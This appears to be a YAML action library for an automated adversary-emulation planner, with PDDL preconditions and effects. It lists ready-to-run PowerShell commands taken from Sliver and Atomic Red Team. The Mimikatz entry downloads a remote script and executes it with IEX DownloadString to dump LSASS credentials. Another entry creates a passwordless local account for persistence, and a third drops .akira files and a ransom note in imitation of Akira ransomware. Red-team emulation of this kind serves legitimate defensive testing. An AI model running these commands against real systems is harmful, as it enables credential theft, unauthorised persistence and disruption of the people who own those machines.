  - uuid: sliver-powershell
    name: Execute PowerShell Command
    id:
      - T1059.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: PowerShell
    description: The `powershell.exe` command executes a PowerShell script or command
      on the remote host. This command is useful for performing system monitoring
      tasks or gathering information about the processes running on a remote machine.
    execution:
      executor: Sliver Session Derive
      command: |
        # no-op — derivation only
    arguments:
      executor_parent:
        description: The session ID of the active Sliver connection.
        required: true
        pddl_index: executor3_var_in_plan
      executor_derived:
        description: The derived Windows Powershell executor.
        required: true
        pddl_index: executor0_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (sliver-session ?executorID - executor ?target - host)
    effects:
      - (powershell ?s2 - executor ?target - host)
      - operator: When
        params:
          condition: (elevated-executor ?executorID - executor)
          effect: (elevated-executor ?s2 - executor)
  - uuid: art-t1003_001-mimikatz-powershell
    name: Powershell Mimikatz
    id:
      - T1003.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: LSASS Memory'
    description: |
      Dumps credentials from LSASS memory by invoking a remote Invoke-Mimikatz.ps1
      (PowerSploit variant). Requires elevated PowerShell context and outbound
      HTTPS to the script host. See ART auto_generated_guid
      66fb0bc1-3c3f-47e9-a298-550ecfefacbc for cross-ref.
    execution:
      executor: Powershell Executor
      command: |
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
    arguments:
      executor:
        description: The Powershell session ID used to invoke the command.
        required: true
        pddl_index: executor0_var_in_plan
      remote_script:
        default: 
          https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
        description: URL to a hosted Invoke-Mimikatz.ps1 (PowerSploit / mirror).
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1136_001-new-localuser-ps
    name: Create a new user in PowerShell
    id:
      - T1136.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Create Account: Local Account'
    description: |
      PowerShell variant of local user creation: `New-LocalUser -NoPassword`
      creates a passwordless local account. Same persistence outcome as
      net user, cleaner cmdlet trail. ART auto_generated_guid
      bc8be0ac-475c-4fbf-9b1d-9fffd77afbde.
    execution:
      executor: Powershell Executor
      command: |
        New-LocalUser -Name "#{username}" -NoPassword
    arguments:
      executor:
        description: The Powershell session ID used to invoke New-LocalUser.
        required: true
        pddl_index: executor0_var_in_plan
      username:
        default: BackupSvcPs
        description: Local account name to create.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (user-created ?u - user ?target - host)
  - uuid: art-t1486-akira-ransomware-sim
    name: Akira Ransomware drop Files with .akira Extension and Ransomnote
    id:
      - T1486
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Data Encrypted for Impact
    description: |
      Simulates Akira ransomware post-encryption artefacts: writes 100
      random-byte 1MB files with `.akira` extension to `C:\` and drops a
      ransom note on the user's Desktop. Does not actually encrypt user
      data — models the observable trail an incident responder would find.
      Under aurora's "technique-attempted" positioning we accept this as
      `data-encrypted` (the .akira files are the encrypted artefact from
      the model's point of view). ART auto_generated_guid
      ab3f793f-2dcc-4da5-9c71-34988307263f.
    execution:
      executor: Powershell Executor
      command: |
        1..#{file_count} | ForEach-Object {
          $out = New-Object byte[] 1073741
          (New-Object Random).NextBytes($out)
          [IO.File]::WriteAllBytes("#{output_dir}\test.$_.akira", $out)
        }
        "Hi friends" | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
        "Your files have been encrypted." | Out-File -Append "$env:UserProfile\Desktop\#{ransom_note_name}"
    arguments:
      executor:
        description: The Powershell session ID used to drop the .akira files and ransom
          note.
        required: true
        pddl_index: executor0_var_in_plan
      file_count:
        default: 100
        description: Number of .akira artefact files to drop.
        required: true
      output_dir:
        default: C:\Users\Public
        description: Target-side directory where .akira files are written.
        required: true
      ransom_note_name:
        default: akira_readme.txt
        description: Ransom-note filename dropped on the user's desktop.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (data-encrypted ?d - data ?target - host)
